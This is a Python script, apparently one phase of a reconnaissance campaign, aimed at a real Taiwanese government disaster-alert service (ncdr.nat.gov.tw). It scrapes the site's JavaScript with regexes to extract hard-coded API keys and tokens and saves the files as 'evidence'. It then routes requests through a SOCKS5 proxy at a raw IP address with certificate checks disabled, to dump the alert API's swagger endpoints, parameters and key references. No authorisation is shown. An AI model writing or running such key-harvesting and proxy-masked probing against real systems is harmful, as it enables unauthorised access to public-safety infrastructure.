#!/usr/bin/env python3
"""Phase 43b: NCDR API key extraction - direct connection + swagger endpoint dump."""
import sys
sys.path.insert(0, '/usr/lib/python3/dist-packages')
import requests, urllib3, json, re, base64
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Direct connection (no proxy) for alerts.ncdr.nat.gov.tw
print("=== alertsmodule.ncdr.nat.gov.tw (direct) ===")
try:
    r = requests.get('https://alertsmodule.ncdr.nat.gov.tw/', verify=False, timeout=20,
                    headers={'User-Agent': 'Mozilla/5.0'})
    print(f"  Root: {r.status_code}, len={len(r.text)}")
    html = r.text
    js_files = re.findall(r'src=["\'](/web/static/js/[^"\']+)["\']', html)
    print(f"  JS files: {js_files}")
    
    for js in js_files:
        js_url = f'https://alertsmodule.ncdr.nat.gov.tw{js}'
        try:
            r2 = requests.get(js_url, verify=False, timeout=20, headers={'User-Agent': 'Mozilla/5.0'})
            print(f"\n  GET {js} -> {r2.status_code}, len={len(r2.text)}")
            if r2.status_code == 200:
                content = r2.text
                # Search for API key patterns
                capapikey_uses = re.findall(r'Capapikey\s*[:=]\s*["\']([A-Za-z0-9_\-]+)', content, re.I)
                api_key_uses = re.findall(r'api[_-]?key\s*[:=]\s*["\']([A-Za-z0-9_\-]{8,})', content, re.I)
                token_uses = re.findall(r'token\s*[:=]\s*["\']([A-Za-z0-9_\-]{8,})', content, re.I)
                header_uses = re.findall(r'[A-Z][a-z]*[Aa]pikey\s*[:=]', content, re.I)
                
                if capapikey_uses:
                    print(f"    Capapikey values: {capapikey_uses}")
                if api_key_uses:
                    print(f"    API key values: {api_key_uses}")
                if token_uses:
                    print(f"    Token values: {token_uses}")
                
                # Look for AddValueApi endpoint references
                api_refs = re.findall(r'AddValueApi|v1/swagger|alerts\.ncdr|ncdr\.nat\.gov\.tw:443', content)
                if api_refs:
                    print(f"    API refs: {api_refs[:10]}")
                
                # Look for base64 or hex encoded keys
                all_strings = re.findall(r'["\']([A-Za-z0-9+/=_\-]{16,})["\']', content)
                for s in all_strings:
                    if 'capapikey' in s.lower() or 'apikey' in s.lower():
                        print(f"    Suspicious string: {s[:100]}")
                
                # Save full JS
                safe_name = js.replace('/', '_').replace('.', '_')
                with open(f'/mnt/c/Users/Administrator/desktop/JySecAI/tpe119_evidence/ncdr_alertsmodule_{safe_name}.js', 'w') as f:
                    f.write(content[:30000])
        except Exception as e:
            print(f"  GET {js} -> ERR {str(e)[:80]}")
except Exception as e:
    print(f"  ERR: {str(e)[:80]}")

# Use proxy for the AddValueApi swagger spec
PROXY = {'https': 'socks5h://202.160.76.154:11085', 'http': 'socks5h://202.160.76.154:11085'}

# Get full swagger spec
print("\n=== Full Swagger Endpoint Analysis (via proxy) ===")
r = requests.get('https://alerts.ncdr.nat.gov.tw/AddValueApi/swagger/v1/swagger.json', 
                proxies=PROXY, verify=False, timeout=20, headers={'User-Agent': 'Mozilla/5.0'})
spec = r.json()

print("Security schemes:")
print(json.dumps(spec.get('components', {}).get('securitySchemes', {}), ensure_ascii=False, indent=2))

print(f"\nAll endpoints ({sum(len(methods) for methods in spec.get('paths', {}).values())} total):")
for path, methods in sorted(spec.get('paths', {}).items()):
    method_list = list(methods.keys())
    # Get parameters for each
    params_info = []
    for m in method_list:
        info = methods[m]
        if isinstance(info, dict):
            params = info.get('parameters', [])
            param_names = [p.get('name', '?') for p in params if isinstance(p, dict)]
            if param_names:
                params_info.append(f"  {m.upper()} params: {param_names}")
    print(f"  {path} [{', '.join(method_list)}]")
    for pi in params_info:
        print(pi)

# Extract all example values from the spec
print("\n=== All example values in spec ===")
examples = re.findall(r'"example"\s*:\s*"([^"]+)"', json.dumps(spec))
for ex in examples[:30]:
    print(f"  Example: {ex}")

# Extract all enum values
print("\n=== All enum values in spec ===")
enums = re.findall(r'"enum"\s*:\s*\[([^\]]+)\]', json.dumps(spec))
for en in enums[:10]:
    print(f"  Enum: {en}")

# Look for any hardcoded keys/URLs in the spec
spec_str = json.dumps(spec)
key_refs = re.findall(r'(?:Capapikey|apikey|apiKey|ApiKey|X-API-Key|X-Api-Key)["\s:=]+["\']?([A-Za-z0-9_\-]{4,})', spec_str, re.I)
print(f"\nKey refs in spec: {key_refs}")

# Check if spec has servers
servers = spec.get('servers', [])
print(f"\nServers: {servers}")

# Check for any base URL in the spec
base_urls = re.findall(r'https?://[^\s"\']+', spec_str)
print(f"\nURLs in spec: {set(base_urls)}")

print("\nDone.")
